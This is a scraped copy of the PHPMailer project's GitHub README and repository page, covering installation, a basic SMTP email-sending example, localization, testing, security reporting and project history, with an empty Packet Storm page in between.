While installing the entire package manually or with Composer is simple, convenient, and reliable, you may want to include only vital files in your project. At the very least you will need [src/PHPMailer.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/PHPMailer.php). If you're using SMTP, you'll need [src/SMTP.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/SMTP.php), and if you're using POP-before SMTP (*very* unlikely!), you'll need [src/POP3.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/POP3.php). You can skip the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder if you're not showing errors to users and can make do with English-only errors. If you're using XOAUTH2 you will need [src/OAuth.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/OAuth.php) as well as the Composer dependencies for the services you wish to authenticate with. Really, it's much easier to use Composer!

## A Simple Example

```
<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.example.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'user@example.com';                     //SMTP username
    $mail->Password   = 'secret';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('from@example.com', 'Mailer');
    $mail->addAddress('joe@example.net', 'Joe User');     //Add a recipient
    $mail->addAddress('ellen@example.com');               //Name is optional
    $mail->addReplyTo('info@example.com', 'Information');
    $mail->addCC('cc@example.com');
    $mail->addBCC('bcc@example.com');

    //Attachments
    $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
```

You'll find plenty to play with in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder, which covers many common scenarios including sending through Gmail, building contact forms, sending to mailing lists, and more.

If you are re-using the instance (e.g. when sending to a mailing list), you may need to clear the recipient list to avoid sending duplicate messages. See [the mailing list example](https://github.com/PHPMailer/PHPMailer/blob/master/examples/mailing_list.phps) for further guidance.

That's it. You should now be ready to use PHPMailer!

## Localization

PHPMailer defaults to English, but in the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder, you'll find many translations for PHPMailer error messages that you may encounter. Their filenames contain [ISO 639-1](https://en.wikipedia.org/wiki/ISO_639-1) language code for the translations, for example `fr` for French. To specify a language, you need to tell PHPMailer which one to use, like this:

```
//To load the French version
$mail->setLanguage('fr', '/optional/path/to/language/directory/');
```

We welcome corrections and new languages – if you're looking for corrections, run the [Language/TranslationCompletenessTest.php](https://github.com/PHPMailer/PHPMailer/blob/master/test/Language/TranslationCompletenessTest.php) script in the tests folder and it will show any missing translations.

## Documentation

Start reading at the [GitHub wiki](https://github.com/PHPMailer/PHPMailer/wiki). If you're having trouble, head for [the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting) as it's frequently updated.

Examples of how to use PHPMailer for common scenarios can be found in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder. If you're looking for a good starting point, we recommend you start with [the Gmail example](https://github.com/PHPMailer/PHPMailer/tree/master/examples/gmail.phps).

To reduce PHPMailer's deployed code footprint, examples are not included if you load PHPMailer via Composer or via [GitHub's zip file download](https://github.com/PHPMailer/PHPMailer/archive/master.zip), so you'll need to either clone the git repository or use the above links to get to the examples directly.

Complete generated API documentation is [available online](https://phpmailer.github.io/PHPMailer/).

You can generate complete API-level documentation by running `phpdoc` in the top-level folder, and documentation will appear in the `docs` folder, though you'll need to have [PHPDocumentor](https://www.phpdoc.org) installed. You may find [the unit tests](https://github.com/PHPMailer/PHPMailer/blob/master/test/PHPMailer/PHPMailerTest.php) a good reference for how to do various operations such as encryption.

If the documentation doesn't cover what you need, search the [many questions on Stack Overflow](https://stackoverflow.com/questions/tagged/phpmailer), and before you ask a question about "SMTP Error: Could not connect to SMTP host.", [read the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting).

## Tests

[PHPMailer tests](https://github.com/PHPMailer/PHPMailer/tree/master/test/) use PHPUnit 9, with [a polyfill](https://github.com/Yoast/PHPUnit-Polyfills) to let 9-style tests run on older PHPUnit and PHP versions.

[![Test status](https://github.com/PHPMailer/PHPMailer/workflows/Tests/badge.svg)](https://github.com/PHPMailer/PHPMailer/actions)

If this isn't passing, is there something you can do to help?

## Security

Please disclose any vulnerabilities found responsibly – report security issues to the maintainers privately.

See [SECURITY](https://github.com/PHPMailer/PHPMailer/tree/master/SECURITY.md) and [PHPMailer's security advisories on GitHub](https://github.com/PHPMailer/PHPMailer/security).

## Contributing

Please submit bug reports, suggestions, and pull requests to the [GitHub issue tracker](https://github.com/PHPMailer/PHPMailer/issues).

We're particularly interested in fixing edge cases, expanding test coverage, and updating translations.

If you found a mistake in the docs, or want to add something, go ahead and amend the wiki – anyone can edit it.

If you have git clones from prior to the move to the PHPMailer GitHub organisation, you'll need to update any remote URLs referencing the old GitHub location with a command like this from within your clone:

```
git remote set-url upstream https://github.com/PHPMailer/PHPMailer.git
```

Please *don't* use the SourceForge or Google Code projects any more; they are obsolete and no longer maintained.

## Sponsorship

Development time and resources for PHPMailer are provided by [Smartmessages.net](https://info.smartmessages.net/), the world's only privacy-first email marketing system.

[![Smartmessages.net privacy-first email marketing logo](https://camo.githubusercontent.com/1c9fac2c126b7258d41730a8c94eabb309db7602733fd88358aa970284c4beca/68747470733a2f2f7777772e736d6172746d657373616765732e6e65742f696d672f736d6172746d657373616765732d6c6f676f2e737667)](https://info.smartmessages.net/)

Donations are very welcome, whether in beer 🍺, T-shirts 👕, or cold, hard cash 💰. Sponsorship through GitHub is a simple and convenient way to say "thank you" to PHPMailer's maintainers and contributors – just click the "Sponsor" button [on the project page](https://github.com/PHPMailer/PHPMailer). If your company uses PHPMailer, consider taking part in Tidelift's enterprise support programme.

## PHPMailer For Enterprise

Available as part of the Tidelift Subscription.

The maintainers of PHPMailer and thousands of other packages are working with Tidelift to deliver commercial
support and maintenance for the open-source packages you use to build your applications. Save time, reduce risk, and
improve code health, while paying the maintainers of the exact packages you
use. [Learn more.](https://tidelift.com/subscription/pkg/packagist-phpmailer-phpmailer?utm_source=packagist-phpmailer-phpmailer&utm_medium=referral&utm_campaign=enterprise&utm_term=repo)

## Changelog

See [changelog](/PHPMailer/PHPMailer/blob/master/changelog.md).

## History

* PHPMailer was originally written in 2001 by Brent R. Matzelle as a [SourceForge project](https://sourceforge.net/projects/phpmailer/).
* [Marcus Bointon](https://github.com/Synchro) (`coolbru` on SF) and Andy Prevost (`codeworxtech`) took over the project in 2004.
* Became an Apache incubator project on Google Code in 2010, managed by Jim Jagielski.
* Marcus created [his fork on GitHub](https://github.com/Synchro/PHPMailer) in 2008.
* Jim and Marcus decide to join forces and use GitHub as the canonical and official repo for PHPMailer in 2013.
* PHPMailer moves to [the PHPMailer organisation](https://github.com/PHPMailer) on GitHub in 2013.

### What's changed since moving from SourceForge?

* Official successor to the SourceForge and Google Code projects.
* Test suite.
* Continuous integration with GitHub Actions.
* Composer support.
* Public development.
* Additional languages and language strings.
* CRAM-MD5 authentication support.
* Preserves full repo history of authors, commits, and branches from the original SourceForge project.

## About

The classic email sending library for PHP

### Topics

[php](/topics/php "Topic: php")
[email](/topics/email "Topic: email")
[php-library](/topics/php-library "Topic: php-library")
[attachment](/topics/attachment "Topic: attachment")
[smtp](/topics/smtp "Topic: smtp")
[phpmailer](/topics/phpmailer "Topic: phpmailer")
[hacktoberfest](/topics/hacktoberfest "Topic: hacktoberfest")
[tls-support](/topics/tls-support "Topic: tls-support")
[xoauth2](/topics/xoauth2 "Topic: xoauth2")

### Resources

[Readme](#readme-ov-file)
### License

[LGPL-2.1 license](#LGPL-2.1-1-ov-file)
### Security policy

[Security policy](#security-ov-file)

[Activity](/PHPMailer/PHPMailer/activity)
[Custom properties](/PHPMailer/PHPMailer/custom-properties)
### Stars

[**21.2k**
stars](/PHPMailer/PHPMailer/stargazers)
### Watchers

[**887**
watching](/PHPMailer/PHPMailer/watchers)
### Forks

[**9.7k**
forks](/PHPMailer/PHPMailer/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer&report=PHPMailer+%28user%29)

## [Releases 64](/PHPMailer/PHPMailer/releases)

[PHPMailer 6.9.3
Latest

Nov 24, 2024](/PHPMailer/PHPMailer/releases/tag/v6.9.3)
[+ 63 releases](/PHPMailer/PHPMailer/releases)

## Sponsor this project

* ![patreon](https://github.githubassets.com/assets/patreon-96b15b9db4b9.svg)
  [patreon.com/**marcusbointon**](https://patreon.com/marcusbointon)
* ![tidelift](https://github.githubassets.com/assets/tidelift-8cea37dea8fc.svg)
  [tidelift.com/funding/github/**packagist/phpmailer/phpmailer**](https://tidelift.com/funding/github/packagist/phpmailer/phpmailer)
* <https://marcus.bointon.com/donations/>

[Learn more about GitHub Sponsors](/sponsors)

## [Packages 0](/orgs/PHPMailer/packages?repo_name=PHPMailer)

No packages published

## [Used by 101k](/PHPMailer/PHPMailer/network/dependents)

[* ![@yeissonvels](https://avatars.githubusercontent.com/u/18552396?s=64&v=4)
* ![@pierodev0](https://avatars.githubusercontent.com/u/138919050?s=64&v=4)
* ![@mrycky23](https://avatars.githubusercontent.com/u/41496830?s=64&v=4)
* ![@dimitri-pletschette](https://avatars.githubusercontent.com/u/61140913?s=64&v=4)
* ![@JuanRodriguez2002](https://avatars.githubusercontent.com/u/161664974?s=64&v=4)
* ![@bimandas0001](https://avatars.githubusercontent.com/u/96987439?s=64&v=4)
* ![@CasaliWe](https://avatars.githubusercontent.com/u/103540440?s=64&v=4)
* ![@Carlos923-so](https://avatars.githubusercontent.com/u/124233700?s=64&v=4)

+ 101,448](/PHPMailer/PHPMailer/network/dependents)

## [Contributors 269](/PHPMailer/PHPMailer/graphs/contributors)

* [![@Synchro](https://avatars.githubusercontent.com/u/81561?s=64&v=4)](https://github.com/Synchro)
* [![@jrfnl](https://avatars.githubusercontent.com/u/663378?s=64&v=4)](https://github.com/jrfnl)
* [![@jimjag](https://avatars.githubusercontent.com/u/84076?s=64&v=4)](https://github.com/jimjag)
* [![@dependabot[bot]](https://avatars.githubusercontent.com/in/29110?s=64&v=4)](https://github.com/apps/dependabot)
* [![@fbonzon](https://avatars.githubusercontent.com/u/1116761?s=64&v=4)](https://github.com/fbonzon)
* [![@voronkovich](https://avatars.githubusercontent.com/u/2299535?s=64&v=4)](https://github.com/voronkovich)
* [![@sinteur](https://avatars.githubusercontent.com/u/13427371?s=64&v=4)](https://github.com/sinteur)
* [![@glensc](https://avatars.githubusercontent.com/u/199095?s=64&v=4)](https://github.com/glensc)
* [![@msturdy](https://avatars.githubusercontent.com/u/373168?s=64&v=4)](https://github.com/msturdy)
* [![@Slamdunk](https://avatars.githubusercontent.com/u/152236?s=64&v=4)](https://github.com/Slamdunk)
* [![@Ayesh](https://avatars.githubusercontent.com/u/811553?s=64&v=4)](https://github.com/Ayesh)
* [![@heronman](https://avatars.githubusercontent.com/u/5522251?s=64&v=4)](https://github.com/heronman)
* [![@gogowitsch](https://avatars.githubusercontent.com/u/6819464?s=64&v=4)](https://github.com/gogowitsch)
* [![@Arisophy](https://avatars.githubusercontent.com/u/46107344?s=64&v=4)](https://github.com/Arisophy)

[+ 255 contributors](/PHPMailer/PHPMailer/graphs/contributors)

## Languages

* [PHP
  99.4%](/PHPMailer/PHPMailer/search?l=php)
* [Shell
  0.6%](/PHPMailer/PHPMailer/search?l=shell)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_1deb7bcc_20250125_054100.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from github.com_6df617e6_20250126_062431.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer%2F)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer%2F)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=PHPMailer%2FPHPMailer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PHPMailer](/PHPMailer)
/
**[PHPMailer](/PHPMailer/PHPMailer)**
Public

* [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings
* [Fork
  9.7k](/login?return_to=%2FPHPMailer%2FPHPMailer)
* [Star
   21.2k](/login?return_to=%2FPHPMailer%2FPHPMailer)

The classic email sending library for PHP

### License

[LGPL-2.1 license](/PHPMailer/PHPMailer/blob/master/LICENSE)

[21.2k
stars](/PHPMailer/PHPMailer/stargazers) [9.7k
forks](/PHPMailer/PHPMailer/forks) [Branches](/PHPMailer/PHPMailer/branches) [Tags](/PHPMailer/PHPMailer/tags) [Activity](/PHPMailer/PHPMailer/activity)
 [Star](/login?return_to=%2FPHPMailer%2FPHPMailer)

 [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings

* [Code](/PHPMailer/PHPMailer)
* [Issues
  36](/PHPMailer/PHPMailer/issues)
* [Pull requests
  11](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects
  0](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

Additional navigation options

* [Code](/PHPMailer/PHPMailer)
* [Issues](/PHPMailer/PHPMailer/issues)
* [Pull requests](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

# PHPMailer/PHPMailer

    master[Branches](/PHPMailer/PHPMailer/branches)[Tags](/PHPMailer/PHPMailer/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2,454 Commits](/PHPMailer/PHPMailer/commits/master/) | | |
| [.github](/PHPMailer/PHPMailer/tree/master/.github ".github") | | [.github](/PHPMailer/PHPMailer/tree/master/.github ".github") |  |  |
| [.phan](/PHPMailer/PHPMailer/tree/master/.phan ".phan") | | [.phan](/PHPMailer/PHPMailer/tree/master/.phan ".phan") |  |  |
| [docs](/PHPMailer/PHPMailer/tree/master/docs "docs") | | [docs](/PHPMailer/PHPMailer/tree/master/docs "docs") |  |  |
| [examples](/PHPMailer/PHPMailer/tree/master/examples "examples") | | [examples](/PHPMailer/PHPMailer/tree/master/examples "examples") |  |  |
| [language](/PHPMailer/PHPMailer/tree/master/language "language") | | [language](/PHPMailer/PHPMailer/tree/master/language "language") |  |  |
| [src](/PHPMailer/PHPMailer/tree/master/src "src") | | [src](/PHPMailer/PHPMailer/tree/master/src "src") |  |  |
| [test](/PHPMailer/PHPMailer/tree/master/test "test") | | [test](/PHPMailer/PHPMailer/tree/master/test "test") |  |  |
| [.codecov.yml](/PHPMailer/PHPMailer/blob/master/.codecov.yml ".codecov.yml") | | [.codecov.yml](/PHPMailer/PHPMailer/blob/master/.codecov.yml ".codecov.yml") |  |  |
| [.editorconfig](/PHPMailer/PHPMailer/blob/master/.editorconfig ".editorconfig") | | [.editorconfig](/PHPMailer/PHPMailer/blob/master/.editorconfig ".editorconfig") |  |  |
| [.gitattributes](/PHPMailer/PHPMailer/blob/master/.gitattributes ".gitattributes") | | [.gitattributes](/PHPMailer/PHPMailer/blob/master/.gitattributes ".gitattributes") |  |  |
| [.gitignore](/PHPMailer/PHPMailer/blob/master/.gitignore ".gitignore") | | [.gitignore](/PHPMailer/PHPMailer/blob/master/.gitignore ".gitignore") |  |  |
| [COMMITMENT](/PHPMailer/PHPMailer/blob/master/COMMITMENT "COMMITMENT") | | [COMMITMENT](/PHPMailer/PHPMailer/blob/master/COMMITMENT "COMMITMENT") |  |  |
| [LICENSE](/PHPMailer/PHPMailer/blob/master/LICENSE "LICENSE") | | [LICENSE](/PHPMailer/PHPMailer/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/PHPMailer/PHPMailer/blob/master/README.md "README.md") | | [README.md](/PHPMailer/PHPMailer/blob/master/README.md "README.md") |  |  |
| [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md "SECURITY.md") | | [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md "SECURITY.md") |  |  |
| [UPGRADING.md](/PHPMailer/PHPMailer/blob/master/UPGRADING.md "UPGRADING.md") | | [UPGRADING.md](/PHPMailer/PHPMailer/blob/master/UPGRADING.md "UPGRADING.md") |  |  |
| [VERSION](/PHPMailer/PHPMailer/blob/master/VERSION "VERSION") | | [VERSION](/PHPMailer/PHPMailer/blob/master/VERSION "VERSION") |  |  |
| [changelog.md](/PHPMailer/PHPMailer/blob/master/changelog.md "changelog.md") | | [changelog.md](/PHPMailer/PHPMailer/blob/master/changelog.md "changelog.md") |  |  |
| [composer.json](/PHPMailer/PHPMailer/blob/master/composer.json "composer.json") | | [composer.json](/PHPMailer/PHPMailer/blob/master/composer.json "composer.json") |  |  |
| [get\_oauth\_token.php](/PHPMailer/PHPMailer/blob/master/get_oauth_token.php "get_oauth_token.php") | | [get\_oauth\_token.php](/PHPMailer/PHPMailer/blob/master/get_oauth_token.php "get_oauth_token.php") |  |  |
| [phpcs.xml.dist](/PHPMailer/PHPMailer/blob/master/phpcs.xml.dist "phpcs.xml.dist") | | [phpcs.xml.dist](/PHPMailer/PHPMailer/blob/master/phpcs.xml.dist "phpcs.xml.dist") |  |  |
| [phpdoc.dist.xml](/PHPMailer/PHPMailer/blob/master/phpdoc.dist.xml "phpdoc.dist.xml") | | [phpdoc.dist.xml](/PHPMailer/PHPMailer/blob/master/phpdoc.dist.xml "phpdoc.dist.xml") |  |  |
| [phpunit.xml.dist](/PHPMailer/PHPMailer/blob/master/phpunit.xml.dist "phpunit.xml.dist") | | [phpunit.xml.dist](/PHPMailer/PHPMailer/blob/master/phpunit.xml.dist "phpunit.xml.dist") |  |  |
| View all files | | |

## Repository files navigation

* README
* LGPL-2.1 license
* Security

[![SWUbanner](https://raw.githubusercontent.com/vshymanskyy/StandWithUkraine/main/banner2-direct.svg)](https://supportukrainenow.org/)

[![PHPMailer](https://camo.githubusercontent.com/6d4a0a8d2ca2b19852106a326edc638c302cb7a4bfa3300f83993f5c278762ff/68747470733a2f2f7261772e6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6d61737465722f6578616d706c65732f696d616765732f7068706d61696c65722e706e67)](https://camo.githubusercontent.com/6d4a0a8d2ca2b19852106a326edc638c302cb7a4bfa3300f83993f5c278762ff/68747470733a2f2f7261772e6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6d61737465722f6578616d706c65732f696d616765732f7068706d61696c65722e706e67)

# PHPMailer – A full-featured email creation and transfer class for PHP

[![Test status](https://github.com/PHPMailer/PHPMailer/workflows/Tests/badge.svg)](https://github.com/PHPMailer/PHPMailer/actions)
[![codecov.io](https://camo.githubusercontent.com/e8d290abf582d18a91f9275e33b7b4e878742877f72440f283439389073702b5/68747470733a2f2f636f6465636f762e696f2f67682f5048504d61696c65722f5048504d61696c65722f6272616e63682f6d61737465722f67726170682f62616467652e7376673f746f6b656e3d694f525a70776d596d4d)](https://codecov.io/gh/PHPMailer/PHPMailer)
[![Latest Stable Version](https://camo.githubusercontent.com/082a4b469d55b1af070c588210496a9bd0497cb883cbca19dfeaed441e711fab/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f762f737461626c652e737667)](https://packagist.org/packages/phpmailer/phpmailer)
[![Total Downloads](https://camo.githubusercontent.com/b56a00b49d58b84a7b4056742b90914f23635008ec6ed5a067ee975ff815af6c/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f646f776e6c6f616473)](https://packagist.org/packages/phpmailer/phpmailer)
[![License](https://camo.githubusercontent.com/12c0c395cd01dd2fb0aec76e0000c8eb6a0fd6f7b65f9f52b0dbd6f289e60fd3/68747470733a2f2f706f7365722e707567782e6f72672f7068706d61696c65722f7068706d61696c65722f6c6963656e73652e737667)](https://packagist.org/packages/phpmailer/phpmailer)
[![API Docs](https://github.com/phpmailer/phpmailer/workflows/Docs/badge.svg)](https://phpmailer.github.io/PHPMailer/)
[![OpenSSF Scorecard](https://camo.githubusercontent.com/e3aec1b3bdc455e8617e3e3d97c4a3dada7b95dc97106a46b9c2ac1dfd6cdd7f/68747470733a2f2f6170692e736563757269747973636f726563617264732e6465762f70726f6a656374732f6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6261646765)](https://api.securityscorecards.dev/projects/github.com/PHPMailer/PHPMailer)

## Features

* Probably the world's most popular code for sending email from PHP!
* Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii, Joomla! and many more
* Integrated SMTP support – send without a local mail server
* Send emails with multiple To, CC, BCC, and Reply-to addresses
* Multipart/alternative emails for mail clients that do not read HTML email
* Add attachments, including inline
* Support for UTF-8 content and 8bit, base64, binary, and quoted-printable encodings
* SMTP authentication with LOGIN, PLAIN, CRAM-MD5, and XOAUTH2 mechanisms over SMTPS and SMTP+STARTTLS transports
* Validates email addresses automatically
* Protects against header injection attacks
* Error messages in over 50 languages!
* DKIM and S/MIME signing support
* Compatible with PHP 5.5 and later, including PHP 8.2
* Namespaced to prevent name clashes
* Much more!

## Why you might need it

Many PHP developers need to send email from their code. The only PHP function that supports this directly is [`mail()`](https://www.php.net/manual/en/function.mail.php). However, it does not provide any assistance for making use of popular features such as encryption, authentication, HTML messages, and attachments.

Formatting email correctly is surprisingly difficult. There are myriad overlapping (and conflicting) standards, requiring tight adherence to horribly complicated formatting and encoding rules – the vast majority of code that you'll find online that uses the `mail()` function directly is just plain wrong, if not unsafe!

The PHP `mail()` function usually sends via a local mail server, typically fronted by a `sendmail` binary on Linux, BSD, and macOS platforms, however, Windows usually doesn't include a local mail server; PHPMailer's integrated SMTP client allows email sending on all platforms without needing a local mail server. Be aware though, that the `mail()` function should be avoided when possible; it's both faster and [safer](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) to use SMTP to localhost.

*Please* don't be tempted to do it yourself – if you don't use PHPMailer, there are many other excellent libraries that
you should look at before rolling your own. Try [SwiftMailer](https://swiftmailer.symfony.com/)
, [Laminas/Mail](https://docs.laminas.dev/laminas-mail/), [ZetaComponents](https://github.com/zetacomponents/Mail), etc.

## License

This software is distributed under the [LGPL 2.1](https://www.gnu.org/licenses/old-licenses/lgpl-2.1.html) license, along with the [GPL Cooperation Commitment](https://gplcc.github.io/gplcc/). Please read [LICENSE](https://github.com/PHPMailer/PHPMailer/blob/master/LICENSE) for information on the software availability and distribution.

## Installation & loading

PHPMailer is available on [Packagist](https://packagist.org/packages/phpmailer/phpmailer) (using semantic versioning), and installation via [Composer](https://getcomposer.org) is the recommended way to install PHPMailer. Just add this line to your `composer.json` file:

```
"phpmailer/phpmailer": "^6.9.2"
```

or run

```
composer require phpmailer/phpmailer
```

Note that the `vendor` folder and the `vendor/autoload.php` script are generated by Composer; they are not part of PHPMailer.

If you want to use XOAUTH2 authentication, you will also need to add a dependency on the `league/oauth2-client` and appropriate service adapters package in your `composer.json`, or take a look at
by @decomplexity's [SendOauth2 wrapper](https://github.com/decomplexity/SendOauth2), especially if you're using Microsoft services.

Alternatively, if you're not using Composer, you
can [download PHPMailer as a zip file](https://github.com/PHPMailer/PHPMailer/archive/master.zip), (note that docs and examples are not included in the zip file), then copy the contents of the PHPMailer folder into one of the `include_path` directories specified in your PHP configuration and load each class file manually:

```
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';
```

If you're not using the `SMTP` class explicitly (you're probably not), you don't need a `use` line for the SMTP class. Even if you're not using exceptions, you do still need to load the `Exception` class as it is used internally.

## Legacy versions

PHPMailer 5.2 (which is compatible with PHP 5.0 — 7.0) is no longer supported, even for security updates. You will find the latest version of 5.2 in the [5.2-stable branch](https://github.com/PHPMailer/PHPMailer/tree/5.2-stable). If you're using PHP 5.5 or later (which you should be), switch to the 6.x releases.

### Upgrading from 5.2

The biggest changes are that source files are now in the `src/` folder, and PHPMailer now declares the namespace `PHPMailer\PHPMailer`. This has several important effects – [read the upgrade guide](https://github.com/PHPMailer/PHPMailer/tree/master/UPGRADING.md) for more details.

### Minimal installation

